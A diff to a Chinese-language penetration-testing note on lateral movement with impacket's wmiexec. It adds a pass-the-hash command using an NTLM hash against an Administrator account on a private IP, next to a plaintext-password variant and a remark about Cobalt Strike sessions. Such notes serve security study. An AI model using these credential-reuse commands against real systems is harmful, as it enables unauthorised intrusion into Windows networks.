@@ -89,7 +89,9 @@
 
 ## 0x06 利用impacket工具包中的wmiexec进行横向移动
 
-   命令：wmiexec ./Administrator:admin!@#45@192.168.3.144 "whoami"
+   命令：wmiexec ./Administrator:admin!@#45@192.168.3.144 "whoami" ##如果直接上CS的话，上线后的权限为administrator
+   
+   hash攻击命令：wmiexec -hashes :518b98ad4178a53695dc997aa02d455c Administrator@192.168.3.73 "whoami"
    
    
   
